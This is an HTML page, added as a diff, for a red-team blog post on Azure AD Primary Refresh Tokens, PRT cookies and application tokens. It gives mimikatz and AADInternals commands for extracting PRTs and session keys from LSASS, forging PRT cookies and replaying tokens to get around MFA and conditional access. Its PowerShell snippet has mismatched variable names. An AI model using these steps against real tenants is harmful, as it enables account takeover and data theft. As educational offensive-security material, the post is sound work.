@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Azure AD : PRT, PRT Cookie and Application Token | </title>
+  <link rel = 'canonical' href = '/posts/azuretoken/'>
+  <meta name="description" content="Red Teamer / Pentester. Focus on Active Directory / Azure / Windows logical bug">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Azure AD : PRT, PRT Cookie and Application Token" />
+<meta property="og:description" content="1. PRT / Session key &amp; PRT Cookie : Quick recap WARNING : This is only an attempt to make a quick summary of the PRT / PRT Cookie mechanism (in order for me to understand it properly) based on some amazing blog post such as jairocadena or microsoft
+WARNING 2 : As the AzureAD device joining process is not the purpose of this article, I can only urge you to read some amazing blog post about it such as this one" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/azuretoken/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-06-09T11:41:04+02:00" />
+<meta property="article:modified_time" content="2022-06-09T11:41:04+02:00" /><meta property="og:site_name" content="Ottersec Blog" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Azure AD : PRT, PRT Cookie and Application Token"/>
+<meta name="twitter:description" content="1. PRT / Session key &amp; PRT Cookie : Quick recap WARNING : This is only an attempt to make a quick summary of the PRT / PRT Cookie mechanism (in order for me to understand it properly) based on some amazing blog post such as jairocadena or microsoft
+WARNING 2 : As the AzureAD device joining process is not the purpose of this article, I can only urge you to read some amazing blog post about it such as this one"/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="/css/styles.4c2b9aa1d874d6766f554b2d404e8fd62ab4761f51ee9b3f358d12e81e7fa43a1b4378db995bc1926bbe5ed98c060be5e7bd4f2470504cf94f22b4b3a74e62b6.css" integrity="sha512-TCuaodh01nZvVUstQE6P1iq0dh9R7ps/NY0S6B5/pDobQ3jbmVvBkmu&#43;XtmMBgvl571PJHBQTPlPIrSzp05itg=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/posts/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" /posts/notes/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2fposts%2fazuretoken%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=%2fposts%2fazuretoken%2f&text=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2fposts%2fazuretoken%2f&title=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fazuretoken%2f&is_video=false&description=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token&body=Check out this article: %2fposts%2fazuretoken%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=%2fposts%2fazuretoken%2f&title=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=%2fposts%2fazuretoken%2f&title=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2fposts%2fazuretoken%2f&name=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token&description=1.%20PRT%20%2f%20Session%20key%20%26amp%3b%20PRT%20Cookie%20%3a%20Quick%20recap%20WARNING%20%3a%20This%20is%20only%20an%20attempt%20to%20make%20a%20quick%20summary%20of%20the%20PRT%20%2f%20PRT%20Cookie%20mechanism%20%28in%20order%20for%20me%20to%20understand%20it%20properly%29%20based%20on%20some%20amazing%20blog%20post%20such%20as%20jairocadena%20or%20microsoft%0aWARNING%202%20%3a%20As%20the%20AzureAD%20device%20joining%20process%20is%20not%20the%20purpose%20of%20this%20article%2c%20I%20can%20only%20urge%20you%20to%20read%20some%20amazing%20blog%20post%20about%20it%20such%20as%20this%20one" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2fposts%2fazuretoken%2f&t=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#prt--session-key">PRT &amp; Session key</a></li>
+    <li><a href="#prt-cookie">PRT Cookie</a></li>
+    <li><a href="#application-token">Application Token</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#21-prt">2.1 PRT</a></li>
+    <li><a href="#22-prt-cookie">2.2 PRT Cookie</a></li>
+    <li><a href="#23-application-access-tokens">2.3 Application Access Tokens</a></li>
+    <li><a href="#24-summary">2.4 Summary</a></li>
+    <li><a href="#3resources">3.Resources</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Azure AD : PRT, PRT Cookie and Application Token
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2022-06-09 11:41:04 &#43;0200 CEST" itemprop="datePublished">2022-06-09</time>
+          
+        </div>
+        
+        
+        
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <h1 id="1-prt--session-key--prt-cookie--quick-recap">1. PRT / Session key &amp; PRT Cookie : Quick recap</h1>
+<p><em><strong>WARNING</strong> : This is only an attempt to make a quick summary of the PRT / PRT Cookie mechanism (in order for me to understand it properly) based on some amazing blog post such as <a href="https://jairocadena.com/2016/11/08/how-sso-works-in-windows-10-devices/">jairocadena</a> or <a href="https://docs.microsoft.com/fr-fr/azure/active-directory/devices/concept-primary-refresh-token">microsoft</a></em></p>
+<p><em><strong>WARNING 2</strong> : As the AzureAD device joining process is not the purpose of this article, I can only urge you to read some amazing blog post about it such as this <a href="https://jairocadena.com/2016/02/01/azure-ad-join-what-happens-behind-the-scenes/">one</a></em></p>
+<p>The Primary Refresh Token is a special credential artifact that is issued to devices that are either <strong>hybrid joined</strong> or <strong>AZure AD joined</strong> <em>AND</em> running at least <strong>Windows 10</strong>.</p>
+<p>This <em>Primary Refrest Token</em> or <em>PRT</em> have the purpose of enforcing the <strong>SingleSignOn</strong> for all of the Azure services. This is the equivalent of the <em>SeamlessSSO</em> on Windows 7 / Windows 8.1.</p>
+<p>It can be easily compared as the <strong>Kerberos TGT</strong> which mostly server the same purpose. The <em>PRT</em> is based on the JWT (JSON Web Token) / Oauth2 technology which contains claims about the user such as :</p>
+<ul>
+<li>Device ID</li>
+<li>MFA</li>
+</ul>
+<p>Please note that the Primary Refresh Token as a default duration of 90 days and a renewable windows of 14 days.</p>
+<p>If the computer support it, the <em>PRT</em> along with the <em>session key</em> will be stored in the <strong>TPM</strong> (TPM &gt;= 2.0) otherwise it will be stored in the <strong>LSASS</strong>.</p>
+<p>In order for the computer to use the PRT there is a new provider implemented called the <em>&ldquo;Cloud Authentication Provider&rdquo;</em> shortened <em>CloudAP</em> which will handle the authentication to Azure AD or ADFS and cache the PRT in the LSA.</p>
+<p>Every application that need to use this SSO will use the other plugin called &ldquo;Web Account Manager&rdquo; abreviated <em>WAM</em> which will use the PRT Cookie to request the different Application Token.</p>
+<p>As an example Chrome and Edge relies on <strong>BrowserCore.exe</strong> which is a &ldquo;client&rdquo; that interact with the <strong>WAM</strong></p>
+<p>Terminology for the rest of the article :</p>
+<ul>
+<li>PRT Token : Primary refresh token obtained through the windows logon process</li>
+<li>Session Key : (Somehow equivalent to the <strong>session key stored in the Ticket Granting Ticket</strong>)</li>
+<li>Context : 24 random bytes used to derive the session key</li>
+<li>PRT Cookie : The signed PRT also called refresh token (e.g : x-ms-RefreshTokenCredential) somhow equivalent to the <strong>TGT</strong></li>
+<li>Application token : Somehow equivalent to the <strong>Service Ticket</strong></li>
+</ul>
+<p><em>Side note: As the PRT contains claims such as MFA or Device ID, if an application is enforcing the Device Based conditionnal access you&rsquo;ll get an access denied &hellip;</em></p>
+<h2 id="prt--session-key">PRT &amp; Session key</h2>
+<p>As stated before the <strong>PRT</strong> is obtained during the Windows Logon and is not usable as is. You&rsquo;ll find below the logon flow stolen from the <a href="https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token">microsoft documentation</a></p>
+<p><img src="/img/mft_logon_prt.png" alt="SCHEMA_LOGON_FLOW"></p>
+<p>We can quickly summarize the authentication flow as the following :</p>
+<ol>
+<li>The user enter his username/password</li>
+<li>CloudAP will request a <em>nonce</em></li>
+<li>Build a request using the username, password, nonce and sign it with the device key. (more info on those device keys <a href="https://jairocadena.com/2018/04/02/windows-hello-for-business-registration-and-authentication-with-azuread/">here</a>)</li>
+<li>Retreive the PRT / Session Key and store it (TPM or LSASS)</li>
+</ol>
+<p>The two essentials cryptographic materials that you&rsquo;ll end up at the end of the authentication flow are :</p>
+<ul>
+<li>The session key</li>
+<li>The Primary Refresh Token</li>
+</ul>
+<p>With those two cryptographic materials you&rsquo;ll be able to generate a <em>PRT Cookie</em>, thus accessing all of the Azure/O365 services through the <em>SSO</em>.</p>
+<h2 id="prt-cookie">PRT Cookie</h2>
+<p>Now that we are in posession of our PRT and the Session key, let&rsquo;s see how the <em>PRT Cookie</em> is generated with and without a TPM :</p>
+<ol>
+<li>Request nonce from login page (i.e : <code>https://microsoftonline.microsoft.com</code>)</li>
+<li>The LSASS (or TPM) derive the session key with a random context (24 random bytes used in <code>BCryptKeyDerivation</code>)</li>
+<li>PRT + Nonce signed by the derived session key</li>
+<li>Use PRT cookie to login / request token</li>
+</ol>
+<p>Unfortunately since the <strong>&ldquo;payload&rdquo;</strong> part of the JWT is encrypted (with the Kstk key obtained during the <a href="https://jairocadena.com/2016/02/01/azure-ad-join-what-happens-behind-the-scenes/">device registration</a>) we can&rsquo;t get much information :</p>
+<pre tabindex="0"><code># PRT Cookie JSON structure (JWT)
+# HEADER.PAYLOAD.SIG
+
+{&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;HS256&#34;,&#34;ctx&#34;:&#34;zk1uCjsCrMGSCDmsoCpNLuOK1+jx06cT&#34;}.eyJ[...]bSJ9.YS7ZtuMOLDiMzQFPzx2nJNDTU8
+</code></pre><h2 id="application-token">Application Token</h2>
+<p>They way to request an Application Token with a PRT cookie is really easy when already having the PRT Cookie :</p>
+<ol>
+<li>Add the PRT Cookie to the logon request headers</li>
+<li>Done !</li>
+</ol>
+<p>The content of the application token (JWT) is divided in three parts :</p>
+<ol>
+<li>The first part which is the <strong>header</strong> with the type of alg</li>
+<li>The last segment : the <strong>signature</strong> of the JWT</li>
+</ol>
+<p>Between those two part we have the <strong>payload</strong> which contains the <strong>claims</strong> with many differents moving parts
+that are defined <a href="https://docs.microsoft.com/fr-fr/azure/active-directory/develop/id-tokens">here</a></p>
+<p>We can find below the decoded <strong>JWT AADGraph</strong> token :</p>
+<pre tabindex="0"><code>{
+  &#34;typ&#34;:&#34;JWT&#34;,
+  &#34;alg&#34;:&#34;RS256&#34;,
+  &#34;x5t&#34;:&#34;jS1X[...]2VzMc&#34;,
+  &#34;kid&#34;:&#34;jS1Xo1[...]QO2VzMc&#34;
+}.{
+  &#34;aud&#34;:&#34;https://graph.windows.net&#34;,
+  &#34;iss&#34;:&#34;https://sts.windows.net/...&#34;,
+  &#34;iat&#34;:1654807010,
+  &#34;nbf&#34;:1654807010,
+  &#34;exp&#34;:1654811858,
+  &#34;acr&#34;:&#34;1&#34;,
+  &#34;aio&#34;:&#34;ASQA2[...]ZZL9EGEGA+8=&#34;,
+  &#34;amr&#34;:[&#34;pwd&#34;],
+  &#34;appid&#34;:&#34;1b73095[..]dac224a7b894&#34;,
+  &#34;appidacr&#34;:&#34;0&#34;,
+  &#34;family_name&#34;:&#34;&lt;FAM_NAME&gt;&#34;,
+  &#34;given_name&#34;:&#34;No&#34;,
+  &#34;ipaddr&#34;:&#34;&lt;IP&gt;&#34;,
+  &#34;name&#34;:&#34;&lt;NAME&gt;&#34;,
+  &#34;oid&#34;:&#34;77cf6[...]3c8ac&#34;,
+  &#34;puid&#34;:&#34;[...]&#34;,
+  &#34;rh&#34;:&#34;0.AU4AB6S[...]AwAAAAAAAAABOAOQ.&#34;,
+  &#34;scp&#34;:&#34;user_impersonation&#34;,
+  &#34;sub&#34;:&#34;IHK4ZNoV[...]k9pTkjfSznf4k&#34;,
+  &#34;tenant_region_scope&#34;:&#34;EU&#34;,
+  &#34;tid&#34;:&#34;93b5a407[..]b324ad5dade9&#34;,
+  &#34;unique_name&#34;:&#34;no_cond@&lt;domain&gt;&#34;,
+  &#34;upn&#34;:&#34;no_cond@&lt;domain&gt;&#34;,
+  &#34;uti&#34;:&#34;VCrJTELv1UaGUC1O6fZAAA&#34;,
+  &#34;ver&#34;:&#34;1.0&#34;
+}.KRkXjaoZ3b4vJIpI5tcP[...]61oEByDHthP54OiaPg
+</code></pre><p>We can see some interesting part such as :</p>
+<ul>
+<li><strong>aud</strong> : The app id <em>URI</em>. As an example for <strong>AADGraph</strong> -&gt; <a href="https://graph.windows.net">https://graph.windows.net</a></li>
+<li><strong>iss</strong> : The security token service and the azure AD tenant  (Only the GUID should vary)</li>
+<li><strong>exp</strong> : The expiration time after which the token will expire.</li>
+</ul>
+<p>You can find all the detailed informations about all the properties <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens">here</a>.</p>
+<h1 id="2-red-team--work-with-the-differents-available-tokens">2. Red team : Work with the differents available tokens</h1>
+<h2 id="21-prt">2.1 PRT</h2>
+<p>We will start by the easiest case with is the presence of a PRT <strong>without TPM</strong>.</p>
+<p>The PRT in LSASS accessible with mimikatz with <code>skurlsa::cloudap</code>. Please note that you will need the <strong>SeDebugPrivilege</strong> since we are touching the LSASS :</p>
+<p><img src="/img/prt.png" alt="PRT"></p>
+<p>As we can see we managed to retrieve the following cryptographic materials :</p>
+<ul>
+<li>The session key</li>
+<li>The Primate Refresh Token</li>
+</ul>
+<p>The session key is encrypted using the <strong>DPAPI</strong> with the <strong>NT SYSTEM</strong> account. In order to decrypt it we need to be in posession of the DPAPI cryptographic material.</p>
+<p>The easiest way is to have mimikatz running as <strong>NT SYSTEM</strong> thanks to <code>token::elevate</code> and then decrypt the the <strong>keyvalue</strong> field with <code>dpapi::cloudapkd /keyvalue:</code>.</p>
+<p><img src="/img/unprotect_session_dpapi.png" alt="DecryptKeyValue"></p>
+<p>We are now in posession of everything that we need in order to craft <strong>our PRT cookie</strong> as long as the PRT is valid (14 days by default).</p>
+<p>Regarding our 2nd case, which is the presence of a PRT with a TPM on the device as of the 2nd of June 2022 <strong>I did not</strong> managed to steal the PRT and the required keys as <a href="https://dirkjanm.io/digging-further-into-the-primary-refresh-token/">it was possible before.</a></p>
+<p>I seems that earlier, one could not retrieve directly the <em>raw session key</em> but the <em>derived one</em> which was indeed enough to sign our PRT.
+The flow was the following :</p>
+<ul>
+<li>Extract the derived session key and the context</li>
+<li>(Extract more derived session key and context for the future, to sign more PRT)</li>
+<li>Sign your PRT with <a href="https://o365blog.com/post/prt/#the-mimikatz-way">mimikatz</a> <code>dpapi::cloudapk</code></li>
+<li>Profit</li>
+</ul>
+<h2 id="22-prt-cookie">2.2 PRT Cookie</h2>
+<p>As we just saw earlier the PRT contains some claims about our current situation suchs as the MFA or the device.</p>
+<p>Unfortunately since the PRT Cookie is &ldquo;just&rdquo; the signed PRT, it <strong>does not</strong> allow us to circumvent the conditionnal access (such as IP location). As such you won&rsquo;t be able to use the PRT cookie if you don&rsquo;t pass the conditionnal access conditions.</p>
+<p>The <strong>PRT Cookie</strong> can be used <strong>as-is</strong> in your browser in the <em>x-ms-RefreshTokenCredential</em> which should grant you access (as long as the enforced CA don&rsquo;t deny you) :</p>
+<pre tabindex="0"><code># Get a PRT cookie with ADDInternals when on a hybrid joined/aad joined device
+Get-AADIntUserPRTToken
+eyJhbGc [....] plpVEJ-4
+</code></pre><p><img src="/img/prt.gif" alt="PRTReplace"></p>
+<p>If you have already compromised a computer and retrieved the PRT and Session Key (as in part 2.1) you can also craft your PRT Cookie manually.</p>
+<p>Keep in mind that once again you will have to be in position to pass the CA otherwise you&rsquo;ll get denied.</p>
+<p>Let&rsquo;s create our PRT cookie thanks to <a href="https://twitter.com/DrAzureAD">DrAzureAD</a> and his work on <a href="https://o365blog.com/post/prt/#the-mimikatz-way">AADInternals</a> :</p>
+<pre tabindex="0"><code># Taken from : https://o365blog.com/post/prt/#the-mimikatz-way
+# Our previsouly extracted PRT from LSASS
+
+$rawPRT = &#34; $rawPRT = &#34;MC5BVTRBQjZTMWs..[..]..N4a1Zt&#34;&#34;
+
+# Add padding
+
+while($rawPRT.Length % 4) {$rawPRT += &#34;=&#34;}
+
+# Convert from Base 64
+
+$PRTBase64 = [text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))
+
+# Add the session key 
+
+$sessionKey = &#34;548e(...]736d868&#34;
+
+# Convert to byte array and base 64 encode
+
+$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzKey -replace &#39;..&#39;, &#39;0x$&amp;,&#39; -split &#39;,&#39; -ne &#39;&#39;))
+
+# Generate a new PRTToken with nonce
+
+$prtToken = New-AADIntUserPRTToken -RefreshToken $PRTBase64 -SessionKey $SKey -GetNonce
+</code></pre><p>We can now test our generated <em>PRT Cookie</em> to request <strong>application tokens</strong> or directly by <strong>injecting it in our broswer</strong> like we did previously.</p>
+<h2 id="23-application-access-tokens">2.3 Application Access Tokens</h2>
+<p>In the end the only token that matter are the <em>Application Tokens</em> that will let you access the desired application ! There is tons of different applications with tons of different <em>applications tokens</em>.</p>
+<p>You can have a rough idea by using the AADInternals and filtering out the different applications tokens available :</p>
+<pre tabindex="0"><code>Function        Get-AADIntAccessTokenForAADGraph                   0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForAADIAMAPI                  0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForAADJoin                    0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForAdmin                      0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForAzureCoreManagement        0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForAzureMgmtAPI               0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForCloudShell                 0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForEXO                        0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForIntuneMDM                  0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForMSCommerce                 0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForMSGraph                    0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForMSPartner                  0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForMySignins                  0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForOfficeApps                 0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForOneDrive                   0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForPTA                        0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForSARA                       0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForSPO                        0.6.6      AADInternals
+Function        Get-AADIntAccessTokenForTeams                      0.6.6      AADInternals
+Function        Get-AADIntSkypeToken                               0.6.6      AADInternals
+</code></pre><p>To obtain those access token you have to <strong>pass</strong> the conditionnal access but once you have them you can extract them from you target (computer A) to your computer (computer B) without to worry about the MFA or the CA !</p>
+<p>Unfortunately for us those tokens lifetime are quite short by default ranging from 60 minutes to 90 minutes.</p>
+<p>Based on my (short) experience the <strong>most useful tokens</strong> (from which you can get the more data) are the following :</p>
+<ul>
+<li>AADGraph</li>
+<li>MSGraph</li>
+<li>AzureCoreManagement
+and you may have to step up you arsenal</li>
+</ul>
+<p>As an example let&rsquo;s make a collect with <em>roadrecon</em> and and <em>AADGraph</em> token :</p>
+<pre tabindex="0"><code>python3 main.py auth --access-token eyJ0eXAiYfw8i[..]D1neX55X-CK1pIj8A
+Tokens were written to .roadtools_auth
+
+python3 main.py gather
+Starting data gathering phase 1 of 2 (collecting objects)
+Starting data gathering phase 2 of 2 (collecting properties and relationships)
+
+ROADrecon gather executed in 3.95 seconds and issued 1018 HTTP requests.
+</code></pre><p>While this short time frame may be enough to make a <strong>roadrecon</strong> collect, within large tenant this may be an issue  and you may have to step up you arsenal</p>
+<p><em>Example with IP CA : proxy your traffic through the SOCKS proxy of your beacon to pass the IP conditionnal access in order to use your PRT Cookie.</em></p>
+<h2 id="24-summary">2.4 Summary</h2>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>MFA Claim (device)</th>
+<th>MFA Claim (others)</th>
+<th>Pass Conditionnal Access</th>
+<th>Extract without TPM</th>
+<th>Extract with TPM</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PRT / Session keys</td>
+<td>x</td>
+<td></td>
+<td></td>
+<td>x</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>PRT Cookie</td>
+<td>x</td>
+<td>x</td>
+<td></td>
+<td>x</td>
+<td>x</td>
+<td></td>
+</tr>
+<tr>
+<td>Application Acces Token</td>
+<td>x</td>
+<td>x</td>
+<td>x</td>
+<td>x</td>
+<td>x</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="3resources">3.Resources</h2>
+<p><a href="https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30">https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30</a></p>
+<p><a href="https://github.com/MicrosoftDocs/azure-docs/blob/main/articles/active-directory/devices/concept-primary-refresh-token.md">https://github.com/MicrosoftDocs/azure-docs/blob/main/articles/active-directory/devices/concept-primary-refresh-token.md</a></p>
+<p><a href="https://jairocadena.com/2016/11/08/how-sso-works-in-windows-10-devices/">https://jairocadena.com/2016/11/08/how-sso-works-in-windows-10-devices/</a></p>
+<p><a href="https://docs.microsoft.com/fr-fr/azure/active-directory/devices/concept-primary-refresh-token">https://docs.microsoft.com/fr-fr/azure/active-directory/devices/concept-primary-refresh-token</a></p>
+<p><a href="https://secwise.be/how-to-bypass-mfa-in-azure-and-o365-part-1/">https://secwise.be/how-to-bypass-mfa-in-azure-and-o365-part-1/</a></p>
+<p><a href="https://www.youtube.com/watch?v=OigKnI68Sfo">https://www.youtube.com/watch?v=OigKnI68Sfo</a></p>
+<p><a href="https://www.youtube.com/watch?v=R5pXessyfIk">https://www.youtube.com/watch?v=R5pXessyfIk</a></p>
+<p><a href="https://dirkjanm.io/assets/raw/romhack_dirkjan.pdf">https://dirkjanm.io/assets/raw/romhack_dirkjan.pdf</a></p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/posts/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#prt--session-key">PRT &amp; Session key</a></li>
+    <li><a href="#prt-cookie">PRT Cookie</a></li>
+    <li><a href="#application-token">Application Token</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#21-prt">2.1 PRT</a></li>
+    <li><a href="#22-prt-cookie">2.2 PRT Cookie</a></li>
+    <li><a href="#23-application-access-tokens">2.3 Application Access Tokens</a></li>
+    <li><a href="#24-summary">2.4 Summary</a></li>
+    <li><a href="#3resources">3.Resources</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2fposts%2fazuretoken%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=%2fposts%2fazuretoken%2f&text=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2fposts%2fazuretoken%2f&title=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fazuretoken%2f&is_video=false&description=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token&body=Check out this article: %2fposts%2fazuretoken%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=%2fposts%2fazuretoken%2f&title=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=%2fposts%2fazuretoken%2f&title=Azure%20AD%20%3a%20PRT%2c%20PRT%20Cookie%20and%20Application%20Token" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
